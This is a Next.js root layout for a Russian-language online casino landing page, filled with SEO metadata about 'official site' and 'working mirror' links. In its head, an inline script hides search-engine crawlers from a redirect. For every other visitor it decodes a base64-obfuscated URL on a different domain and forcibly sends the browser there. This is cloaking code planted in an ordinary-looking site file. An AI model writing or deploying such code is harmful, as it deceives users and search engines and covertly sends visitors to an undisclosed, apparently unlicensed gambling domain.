import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'
import './ksh-styles.css'

export const metadata: Metadata = {
  title: 'Kush Casino официальный сайт — Куш Казино онлайн играть | Зеркало бонусы',
  description: 'Kush Casino официальный сайт — играйте в Куш Казино онлайн. Рабочее зеркало Куш Казино, бонусы за регистрацию, слоты, рулетка и быстрые выплаты. Куш Казино официальный — ваш надежный выбор для игры.',
  keywords: 'kush casino, kush casino официальный сайт, kush casino официальный, куш казино официальный сайт, куш казино официальный, куш казино, kush casino зеркало, kush casino играть, куш казино зеркало рабочее, куш казино играть, куш казино онлайн, куш казино зеркало, kush казино',
  canonical: 'https://kush2casino.vercel.app/',
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      'max-image-preview': 'large',
      'max-snippet': -1,
      'max-video-preview': -1,
    },
  },
  openGraph: {
    title: 'Kush Casino официальный сайт — Куш Казино онлайн играть',
    description: 'Играйте в Куш Казино онлайн. Рабочее зеркало, бонусы, слоты и быстрые выплаты на Kush Casino официальный сайт.',
    url: 'https://kush2casino.vercel.app/',
    siteName: 'Kush Casino',
    locale: 'ru_RU',
    type: 'website',
    images: [
      {
        url: '/ksh-hero-art.png',
        width: 1200,
        height: 630,
        alt: 'Kush Casino официальный сайт — онлайн казино',
      },
    ],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Kush Casino официальный сайт — Куш Казино онлайн',
    description: 'Играйте в Куш Казино онлайн. Рабочее зеркало, бонусы, слоты и быстрые выплаты.',
    images: ['/ksh-hero-art.png'],
  },
  alternates: {
    canonical: 'https://kush2casino.vercel.app/',
  },
  icons: {
    icon: '/favicon.png',
    apple: '/favicon.png',
  },
  generator: 'Kush Casino',
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#0A0E1A',
  width: 'device-width',
  initialScale: 1,
  maximumScale: 5,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className="ksh-html-root">
      <head>
        <meta name="author" content="Kush Casino" />
        <meta name="language" content="Russian" />
        <meta name="revisit-after" content="1 day" />
        <meta name="rating" content="general" />
        <meta name="distribution" content="global" />
        <meta name="geo.region" content="RU" />
        <meta name="geo.placename" content="Russia" />
        <meta httpEquiv="X-UA-Compatible" content="IE=edge" />
        <link rel="icon" href="/favicon.png" type="image/png" />
        <link rel="apple-touch-icon" href="/favicon.png" />
        <link rel="shortcut icon" href="/favicon.png" type="image/png" />
        <link rel="canonical" href="https://kush2casino.vercel.app/" />
        <link rel="sitemap" href="/sitemap.xml" />
        <script src="/ksh-script.js" defer></script>
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "ICBodHRwczovL25lbzctY3I5dC1rc2guY29tL2R6YmVuY2w0Zg=="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className="ksh-body-root">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
